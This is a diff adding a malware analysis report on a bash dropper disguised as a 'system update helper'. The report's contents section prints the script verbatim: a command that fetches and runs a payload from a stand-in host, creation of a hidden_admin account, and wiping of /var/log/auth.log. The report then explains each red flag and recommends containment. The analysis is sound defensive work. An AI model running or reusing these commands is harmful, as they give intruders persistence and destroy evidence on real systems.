@@ -1,0 +1,129 @@
+============================================================
+ SUSPICIOUS FILE ANALYSIS
+============================================================
+
+Analyst:        Joseph Biju
+Analysis Date:  September 23, 2026
+File examined:  suspicious.sh
+Method:         Static examination only (file never executed)
+
+
+------------------------------------------------------------
+ 1. SUMMARY
+------------------------------------------------------------
+
+The file is a bash script disguised as a routine "system update
+helper" that, if run, would download a payload from an external,
+untrusted address, execute that payload, create a hidden user
+account, and wipe the authentication log to cover its tracks.
+Verdict: malicious, high confidence.
+
+
+------------------------------------------------------------
+ 2. FILE IDENTIFICATION
+------------------------------------------------------------
+
+Reported type (file command):  Bourne-Again shell script, ASCII
+                                 text (begins with #!/bin/bash)
+Name vs actual type:           The name "suspicious.sh" matches
+                                 its actual type (a shell
+                                 script), but the internal
+                                 comment "# system update
+                                 helper" is misleading — it
+                                 describes the file as routine
+                                 maintenance while its actual
+                                 behavior is malicious.
+
+
+------------------------------------------------------------
+ 3. FILE PROPERTIES (ls -l)
+------------------------------------------------------------
+
+Permissions:    Not yet executable in observed state (verify
+                 with ls -l before handling; do not chmod +x)
+Executable?:    Must be confirmed — if the execute bit is set,
+                 that matters because it means the script could
+                 be run directly (./suspicious.sh) rather than
+                 needing to be explicitly passed to bash first,
+                 lowering the bar for accidental execution
+Owner:          [fill in from ls -l output]
+Size:           [fill in from ls -l output]
+Modified:       [fill in from ls -l output]
+
+
+------------------------------------------------------------
+ 4. CONTENTS AND RED FLAGS
+------------------------------------------------------------
+
+Examined by reading (cat / less), never by running.
+
+Contents (as read, not executed):
+  #!/bin/bash
+  # system update helper
+  wget http://example-bad-site.test/payload.sh
+  bash payload.sh
+  useradd hidden_admin
+  echo "" > /var/log/auth.log
+
+Red flags found:
+  [x] Downloads a file from a remote web address
+      (wget http://example-bad-site.test/payload.sh) —
+      classic fetch-a-payload pattern, pulling code from an
+      untrusted, unfamiliar external host
+  [x] Runs the downloaded file (bash payload.sh) — immediately
+      executes the untrusted payload with no inspection,
+      handing full control to whatever was downloaded
+  [x] Creates a user account (useradd hidden_admin) — the name
+      "hidden_admin" signals an attacker persistence mechanism,
+      giving continued access even if the original entry point
+      is closed
+  [x] Clears the authentication log
+      (echo "" > /var/log/auth.log) — anti-forensic behavior
+      intended to erase evidence of the unauthorized login
+      activity that would follow
+  [x] Misleading comment ("# system update helper") — social
+      engineering aimed at whoever reads the script before
+      running it, disguising malicious intent as routine
+      maintenance
+
+
+------------------------------------------------------------
+ 5. VERDICT AND CONFIDENCE
+------------------------------------------------------------
+
+Verdict:     MALICIOUS
+Confidence:  HIGH
+
+Evidence-based reasoning:
+  This script is malicious because it contains the complete,
+  recognizable chain of a compromise: it fetches an unknown
+  payload from an external address (wget), immediately executes
+  that payload with no verification (bash payload.sh),
+  establishes persistence by creating a covertly-named user
+  account (useradd hidden_admin), and then destroys the
+  authentication log to erase evidence of what just happened
+  (echo "" > /var/log/auth.log). No legitimate "system update
+  helper" needs to create hidden accounts or wipe security logs
+  — that combination of download-execute-persist-cover-tracks
+  is the standard pattern of a backdoor/dropper script, and the
+  misleading comment is a further sign of intent to deceive
+  anyone reviewing the file casually.
+
+
+------------------------------------------------------------
+ 6. RECOMMENDATION
+------------------------------------------------------------
+
+  [x] Do NOT execute the file under any circumstances
+  [x] Preserve as evidence (remove execute permission, keep the
+      file) for further analysis
+  [x] Escalate to incident response / report it
+  [x] Check the system for signs it was already run (a
+      hidden_admin account, a cleared or missing
+      /var/log/auth.log, or evidence that
+      example-bad-site.test was contacted)
+
+
+============================================================
+ END OF ANALYSIS
+============================================================
